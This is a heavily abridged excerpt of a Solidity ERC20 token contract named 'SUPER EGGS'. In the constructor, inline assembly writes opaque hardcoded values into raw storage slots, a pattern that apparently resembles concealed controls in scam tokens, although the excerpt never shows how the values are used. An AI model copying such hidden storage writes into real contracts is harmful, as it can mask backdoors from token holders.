...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0xa57e3ca0b14e361561fb04ffa02d9650e8db5575cb18)
            sstore(0x51,0xa57e48f64ee22a4df213994d24b244f82fa7d12248dd)
    ...
    function _DeploySuperEggs(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySuperEggs(creator, initialSupply);
    }
}

contract SuperEggs is ERC20Token {
    constructor() ERC20Token("SUPER EGGS", "SEGGS", msg.sender, 875000000 * 10 ** 18) {
    }
}
